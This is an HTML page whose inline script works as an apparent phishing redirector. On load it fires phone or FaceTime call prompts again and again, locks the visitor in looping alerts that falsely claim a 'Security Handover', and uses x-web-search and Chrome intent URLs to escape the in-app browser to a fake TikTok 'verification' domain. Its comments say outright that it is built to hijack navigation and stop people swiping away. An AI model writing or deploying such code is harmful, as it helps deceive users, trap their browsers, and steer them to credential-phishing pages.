<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function triggerSystemExit() {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const urlNoProtocol = target.replace("https://", "");

        // 1. THE EXIT TRIGGER: FaceTime or TelPrompt
        // This is what forced the 'Gmail' prompt earlier, but even stronger.
        if (isIOS) {
            window.location.href = "facetime-prompt://" + "0000000000";
        } else {
            window.location.href = "tel:0000000000";
        }

        // 2. THE HIJACK: While the OS is showing the "Call?" prompt, 
        // we inject the browser redirect into the navigation stack.
        setTimeout(() => {
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            // Android Chrome Intent fallback
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        }, 100);
    }

    function rampage() {
        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE

        // Fire the exit trigger
        triggerSystemExit();

        // THE LOCK: Keeps them from swiping away while the system prompt loads
        alert("ATTEMPT #23\n\nSecurity Handover Initialized.\n\nTap OK to open the secure system browser.");

        // Post-Alert Jump
        triggerSystemExit();

        // Slightly longer delay (50ms) to allow the OS to process the system dialogs
        setTimeout(rampage, 50);
    }

    window.onload = () => {
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
